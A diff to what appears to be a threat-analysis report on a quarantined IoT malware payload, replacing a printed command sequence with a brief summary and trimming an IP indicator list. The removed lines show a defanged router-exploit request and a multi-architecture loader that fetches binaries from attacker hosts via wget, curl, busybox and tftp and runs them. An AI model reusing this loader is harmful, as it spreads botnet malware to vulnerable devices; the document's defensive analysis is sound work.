@@ -25,108 +25,14 @@ A quarantined payload was recovered from attacker-referenced infrastructure and 
 3. Oraculo safe-fetch recovered the payload into quarantine without execution.
 4. The repository published defensive analysis, metadata, IOCs, YARA and a base64 raw archive.
 
-## Observed command sequence
+## Observed execution chain
 
-1. `POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1`  
-   Meaning: observed command fragment.
-2. `wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup`  
-   Meaning: download payload or remote script.
-3. `cd /tmp 2>/dev/null`  
-   Meaning: change working directory.
-4. `cd /var/tmp 2>/dev/null`  
-   Meaning: change working directory.
-5. `cd /dev/shm 2>#!/bin/sh`  
-   Meaning: attempt execution.
-6. `HOST="91[.]199[.]133[.]133:8080"`  
-   Meaning: observed command fragment.
-7. `BIN=/tmp/[.]n`  
-   Meaning: observed command fragment.
-8. `/dev/null`  
-   Meaning: observed command fragment.
-9. `ARCH=""`  
-   Meaning: observed command fragment.
-10. `CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20)`  
-   Meaning: observed command fragment.
-11. `case "$CPUINFO" in`  
-   Meaning: observed command fragment.
-12. `*mips*el*|*MIPS*el*|*mips*le*) ARCH="mipsel"`  
-   Meaning: observed command fragment.
-13. `*mips*|*MIPS*) ARCH="mips"`  
-   Meaning: observed command fragment.
-14. `*arm*|*ARM*)`  
-   Meaning: observed command fragment.
-15. `if echo "$CPUINFO" | grep -q "v7"`  
-   Meaning: observed command fragment.
-16. `then ARCH="armv7l"`  
-   Meaning: observed command fragment.
-17. `elif echo "$CPUINFO" | grep -q "aarch64\|armv8\|arm64"`  
-   Meaning: observed command fragment.
-18. `then ARCH="arm"`  
-   Meaning: observed command fragment.
-19. `else ARCH="arm"`  
-   Meaning: observed command fragment.
-20. `fi`  
-   Meaning: observed command fragment.
-21. `*x86_64*|*amd64*|*AMD64*) ARCH="x86_64"`  
-   Meaning: observed command fragment.
-22. `*i486*|*i586*|*i686*|*Intel*) ARCH="x86_64"`  
-   Meaning: observed command fragment.
-23. `*powerpc*|*ppc*|*PowerPC*) ARCH="powerpc"`  
-   Meaning: observed command fragment.
-24. `*)`  
-   Meaning: observed command fragment.
-25. `UNAME=$(uname -m 2>/dev/null)`  
-   Meaning: observed command fragment.
-26. `case "$UNAME" in`  
-   Meaning: observed command fragment.
-27. `mips) ARCH="mips"`  
-   Meaning: observed command fragment.
-28. `mipsel) ARCH="mipsel"`  
-   Meaning: observed command fragment.
-29. `arm*) ARCH="arm"`  
-   Meaning: observed command fragment.
-30. `aarch64) ARCH="arm"`  
-   Meaning: observed command fragment.
-31. `x86_64) ARCH="x86_64"`  
-   Meaning: observed command fragment.
-32. `i*86) ARCH="x86_64"`  
-   Meaning: observed command fragment.
-33. `*) ARCH="mips"`  
-   Meaning: observed command fragment.
-34. `# default fallback`  
-   Meaning: observed command fragment.
-35. `esac`  
-   Meaning: observed command fragment.
-36. `esac`  
-   Meaning: observed command fragment.
-37. `case "$ARCH" in`  
-   Meaning: observed command fragment.
-38. `armv7l|armv5l|armv4l|arm) REAL_ARCH="arm"`  
-   Meaning: observed command fragment.
-39. `mips) REAL_ARCH="mips"`  
-   Meaning: observed command fragment.
-40. `mipsel) REAL_ARCH="mipsel"`  
-   Meaning: observed command fragment.
-41. `x86_64|i486) REAL_ARCH="x86_64"`  
-   Meaning: observed command fragment.
-42. `powerpc) REAL_ARCH="arm"`  
-   Meaning: observed command fragment.
-43. `# fallback to arm`  
-   Meaning: observed command fragment.
-44. `*) REAL_ARCH="mips"`  
-   Meaning: observed command fragment.
-45. `(wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null`  
-   Meaning: download payload or remote script.
-46. `chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null`  
-   Meaning: download payload or remote script.
-47. `chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null`  
-   Meaning: download payload or remote script.
-48. `chmod 7esac`  
-   Meaning: change permissions to make file executable.
-49. `777 $BIN`  
-   Meaning: observed command fragment.
-50. `$BIN)`  
-   Meaning: observed command fragment.
+1. HTTP request targeted a Boa/formPing6-style endpoint.
+3. Command attempted to change into `/tmp`.
+5. Command attempted to make the downloaded payload executable.
+7. Related loader activity attempts architecture detection and multi-method download fallback.
+
+Full raw command evidence is preserved in `analysis/command_trace.md` and `evidence/command_raw_defanged.txt`.
 
 
 ## Indicators
@@ -138,8 +44,6 @@ A quarantined payload was recovered from attacker-referenced infrastructure and 
 
 ### IPs
 
-- `119.0.0.0`
-- `120.0.0.0`
 - `154.90.70.23`
 
 
